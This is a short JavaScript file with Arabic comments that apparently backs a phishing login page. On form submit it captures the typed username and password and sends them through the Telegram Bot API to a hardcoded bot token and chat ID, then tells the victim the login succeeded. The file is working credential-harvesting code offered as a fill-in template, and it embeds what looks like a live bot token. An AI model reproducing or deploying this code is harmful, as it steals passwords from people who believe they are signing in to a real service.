// script.js
document.getElementById("login-form").addEventListener("submit", function(event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    const token = "7529460558:AAFMygNctK2-G6FbZOKKIjXvlVemsDvM9OE";  // استبدل بـ توكن البوت الخاص بك
    const chatId = "6815056741";     // استبدل بـ chat_id الخاص بك

    const message = `👤 اسم المستخدم: ${username}\n🔐 كلمة السر: ${password}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log("تم إرسال البيانات بنجاح");
        alert("تم تسجيل الدخول بنجاح!");
    })
    .catch(error => {
        console.error("حدث خطأ: ", error);
        alert("حدث خطأ أثناء تسجيل الدخول.");
    });
});
